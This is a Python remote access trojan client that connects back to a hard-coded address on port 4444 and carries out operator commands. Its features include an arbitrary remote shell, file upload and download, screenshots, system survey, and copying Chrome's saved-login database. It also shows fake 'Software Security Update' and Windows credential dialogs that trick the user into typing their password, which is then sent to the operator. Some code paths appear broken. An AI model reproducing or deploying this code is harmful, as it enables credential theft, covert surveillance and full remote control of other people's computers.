import argparse
import json
import socket
import sys
import time
import subprocess
import os
import shutil
import ctypes
import zipfile

#from core import crypto, persistence, scan, survey, toolkit

#from __init__ import __version__
host = "10.110.0.228"
bash = False
END_OF_STRING = "[XX]END OF STRING[XX]"
END_OF_FILE = "[XX]END OF DATA[XX]"
def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}".format(errors)
    except KeyboardInterrupt:
        print("Terminated command.")
# determine system platform
if sys.platform.startswith('win'):
    PLAT = 'win'
elif sys.platform.startswith('linux'):
    PLAT = 'nix'
elif sys.platform.startswith('darwin'):
    PLAT = 'mac'
else: 
    sys.exit(1)
def win_client():
    if PLAT == 'win':
        return True
    else:
        return False
def osx_client():
    if PLAT == 'mac':
        return True
    else:
        return False
def lnx_client():
    if PLAT == 'nix':
        return True
    else:
        return False
def survey():
    #    check for vm status
    vm = False
    vms = ['VirtualBox','Oracle','VMWare','Parallels','Qemu',
            'Microsoft VirtualPC','Virtuozzo','Xen']
    output=run_command("ioreg -l | grep -e Manufacturer -e 'Vendor Name'")
    for n in vms:
        if n.lower() in output.decode('utf-8').lower():
            vm = "This is a {} Virtual Machine.\n".format(n)
    if not vm: vm = "Appears to be a physical host\n"
    lip = get_lan_ip()
    macaddr = run_command("ifconfig en1 | awk '/ether/{print $2}'")
    hostname = socket.gethostname()
    uname = run_command('uname -a')
    user = run_command("whoami").strip().replace("\\","-")
    everything = '''
    VMScan  :\t{}
    IP      :\t{}
    MAC ADDR:\t{}
    Hostname:\t{}
    User:\t{}
    '''.format(vm, lip, macaddr, hostname, user)
    print("Local Info: \n\n"+everything)
    session.send((everything+END_OF_STRING).encode('utf-8'))
def Upload(filename):
	bgtr = True
	try:
		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			session.send(fileData.encode('utf-8'))
		f.close()
	except:
		time.sleep(0.1)
	time.sleep(0.8)
	session.send(("").encode('utf-8'))
	time.sleep(0.8)
	return "Finished download."
def Download(filename):
	g = open(filename, 'wb')
	fileData = session.recv(1024)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	return "Finished upload."
def message(msg):
    message = msg
    if win_client():
#        message=receive(client_socket)
        cmd = 'powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message)
        run_command(cmd)
        resp = "[+] Popup window successfully executed\n"
#        session.send(resp.encode('utf-8'))
    if osx_client():
#        message=receive(client_socket)
        cmd = "osascript -e 'tell app \"System Events\" to display dialog \"{}\" buttons {{\"OK\"}} default button \"OK\" '".format(message)
        run_command(cmd)
        resp = "[+] Popup window successfully executed\n"
#        session.send(resp.encode('utf-8'))
def lockscreen():
    if win_client():
        success = "[+] Command successfully executed.\n"
        ctypes.windll.user32.LockWorkStation()
#        send(client_socket,success)
    if osx_client():
        resp=run_command('/System/Library/CoreServices/"Menu Extras"/User.menu/Contents/Resources/CGSession -suspend')
#        send(client_socket,resp)
    if lnx_client():
        resp=run_command('vlock -a -s')
#        send(client_socket,resp)

    
def askpass():
    
    response = ''
    if PLAT == 'win':
        while True:
            cmd1 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
            cmd2 = 'echo $cred.getnetworkcredential().password;'
            full_cmd = 'Powershell "{} {}"'.format(cmd1,cmd2)
            response = run_command(full_cmd)
            if response.strip() != '' and not response.strip().startswith('[!]'): break
#        response = '[+] Password: {}'.format(response.strip())
        session.send(response)
        

    if PLAT == 'mac':
        while True:
            sftware = '/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns'
            alert = '/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns'
            if os.path.exists(sftware):
                cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon file \"/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns\" as alias' -e 'text returned of result'"
            elif os.path.exists(alert):
                cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns\" as alias' -e 'text returned of result'"
            else:
                cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon caution' -e 'text returned of result'"
            response=run_command(cmd)
            if response.strip() == '':
                cmd = "osascript -e 'Tell application \"System Events\" to display notification \"Software Security Updates are required.\nPlease enter your password.\" with title \"Apple Security\" '"
                cmd=run_command(cmd)
            else:
#                response = "[+] Password: {}".format(response.strip())
                p = "\033[32m✔  \033[0m"+"Password: "
                session.send(p.encode('utf-8')+response)
                print(response)
#                return response
                break
def get_chrome_path():
    if win_client():
        PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    if osx_client():
        PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    if lnx_client():
        PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
        if (os.path.isdir(PathName) == False):
            return "[!] Chrome Doesn't exists", False
    return PathName, True
def chrome_dump():
    if win_client():
        temp = 'C:\\Windows\\Temp\\'
    else:
        temp = '/tmp/'
    info_list = ''
    path, success = get_chrome_path()
    if success:
        path = os.path.join(path,"Login Data")
        new_path = os.path.join(temp,'c_log_626')
        if os.path.exists(path):
            shutil.copyfile(path, new_path)
            suc = "SUCCESS"
            session.send(suc.encode('utf-8'))
        else:
            err = '[!] The path "{}" does not exist.'.format(path)
            session.send(err.encode('utf-8'))
    else:
        err = '[!] The path "{}" does not exist.'.format(path)
        send(err.encode('utf-8'))
#    session.send(response)
def get_lan_ip():
    ip = socket.gethostbyname(socket.gethostname())
    if ip.startswith("127.") and os.name != "nt":
        interfaces = ["eth0","eth1","eth2","wlan0","wlan1","wifi0","ath0","ath1","ppp0"]
        for ifname in interfaces:
            try:
                ip = get_interface_ip(ifname)
                break;
            except IOError:
                pass
    return ip
def cd(dire):
    cd_dir = dire
    if os.path.exists(cd_dir):
        if os.path.isdir(cd_dir):
            os.chdir(cd_dir)
#            path_name = os.getcwd()
            resp = "Directory change successful"
#            session.send(resp.encode('utf-8'))
#        send(client_socket, resp)
        else:
            err = "[!] {}: Is not a directory\n".format(cd_dir)
            session.send(err.encode('utf-8'))
    else:
        err = "[!] {}: No such directory\n".format(cd_dir)
        session.send(err.encode('utf-8'))
def Send(txt):
    session.send(txt.encode('utf-8'))
def connectServer(ip, port):
    global session, remoteIP
    session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    remoteIP = ip

    try:
        session.connect((remoteIP, port))

        print("Connected to remote host")
        connec = get_lan_ip()+":"+str(port)+" -> "+remoteIP+":4444"
        print(connec)
        print("Sending Local info")
        print("OS: "+sys.platform)
        print("Hostname: "+socket.gethostname())
        Send(sys.platform+" "+socket.gethostname()+END_OF_STRING)
#        session.send(connec.encode('utf-8'))
        
    except socket.error:
        print("Cannot connect to remote host")
        exit()

def client_loop(conn):
    while True:
        results = ''

        # wait to receive data from server
        data = conn.recv(1024)
        print("Received: "+data)
connectServer(host, 4444)        
while True:
    data = session.recv(1024)
    after = (data.decode('utf-8')).replace(END_OF_STRING, "")
    print(after)
#    if after == "connected!":
#        survey()
    if bash == False:
        if after == "kill":
            print("Kill command detected")
            session.close()
            break
        elif after == "askpass":
            askpass()
        elif after == "lockscreen":
            lockscreen()
        elif after == "survey":
            survey()
        elif after == "chromedump":
            chrome_dump()
        elif "cd" in after:
            di = after[3:]
            print("Changing to: \n"+di)
            cd(di)
        elif "message" in after:
            ms = after[7:]
            message(ms)
        elif after.startswith("download") == True:
            print("Downloading..")
            # Tranferring Data from Server > Client

                        # set file name
            fileName = after[9:]

            try:
                f = open(fileName, 'r')
                l = f.read(1024)

                while (l):
                    session.send(l.encode('utf-8'))
                    l = f.read(1024)
                f.close()
                print("Finished.")
                session.send(END_OF_FILE.encode('utf-8'))

            except IOError:
                args = "File not found\n" + END_OF_STRING
                session.send(args.encode('utf-8'))
#            session.send(Upload(after[9:]).encode('utf-8'))
                
        elif after == "screenshot":
            os.system("screencapture -x scr.jpg")
            fileName = "scr.jpg"
            try:
                print("Reading Screenshot")
#                with open(path, 'rb') as f:
#                    contents = f.read()
                f = open(fileName, 'rb')
                l = f.read(1024)
                print("Sending Data")
                while (l):
                    session.send(l)
                    l = f.read(1024)
                f.close()
                print("Finished.")
                session.send(END_OF_FILE.encode('utf-8'))

            except IOError:
                args = "File not found\n" + END_OF_STRING
                session.send(args.encode('utf-8'))
        elif after.startswith("upload") == True:
            session.send(Download(after[7:]).encode('utf-8'))
        elif after == "ls":
            session.send(run_command("ls"))
        elif after == "bash_true":
            bash = True
            print("Shell Entered!")
            retval = ("\n\033[36m"+str(run_command('whoami')).replace(
"\\n", "")+"\033[0m@\033[34m"+str(run_command('hostname')).replace(
"\\n", "")+"\033[0m: \033[33m"+os.getcwd()+"\n\033[36m$\033[0m ")
            session.send(retval.encode('utf-8'))
            print("Sent Prompt!")
    else:
        if after == "exit":
            bash = False
#            session.send(("\033[36mi\033[0m Terminated Bash"))
        elif "cd" in after:
            di = after[3:]
            print("Changing to: \n"+di)
            cd(di)
        
        else:
           print("\nRunning: "+after)
        out = str(run_command(str(after)))
        print("\nOutput: "+out)
        retval2 = (str(out).replace("\\n", "\n")+"\n"+"\n\033[36m"+str(run_command('whoami')).replace(
"\\n", "")+"\033[0m@\033[34m"+str(run_command('hostname')).replace(
"\\n", "")+"\033[0m: \033[33m"+os.getcwd()+"\n\033[36m$\033[0m ")
        retval = (str(out).replace("\\n", END_OF_STRING)+"\n\n"+str(run_command('whoami')).replace("\\n", "")+"@"+str(run_command('hostname')).replace("\\n", "")+": "+os.getcwd()+"\n$ ")
        session.send(retval2.encode('utf-8'))
            
            
    
    
#        session.send(("Shell Entered!").encode('utf-8'))

        

#        conn.send(crypto.encrypt(data, dhkey))